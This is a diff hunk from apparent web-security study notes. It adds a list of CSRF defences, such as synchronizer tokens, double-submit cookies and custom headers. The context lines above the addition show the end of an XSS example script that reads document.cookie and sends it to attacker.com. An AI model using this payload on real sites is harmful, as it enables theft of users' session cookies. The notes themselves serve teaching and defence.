@@ -112,3 +112,17 @@ an example scenario, forging this script in a field in an address form and steal
   var stolenCookies = document.cookie;
   new Image().src = 'https://attacker.com/steal?cookies=' + encodeURIComponent(stolenCookies);
 </script>
+
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<PREVENTING CSRF ATTACK >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+i)Double Submit Cookie pattern
+Uses cookies to prevent CSRF. When a client authenticates, the server generates a cookie with a token, which is sent to the client along with the response.
+Custom request headers
+ii)Add a servlet filter that checks requests to change the state of a valid CSRF token. The CSRF token is passed as a custom header and is valid for the user's session duration.
+iii)Synchronizer token pattern
+Generates a unique token for each request that attackers can't steal. This method uses a random unique value to validate if the user is authenticated.
+iv)Enable user interaction
+Requires user interaction to help prevent operations by unauthorized users, including CSRF attacks.
+v)Design and test token synchronization
+Ensure tokens are properly synchronized and not easily guessable.
+vi)Use Referer header
+Verifies the origin of the request to defend against CSRF attacks. This approach is often subject to bypasses and not recommended.
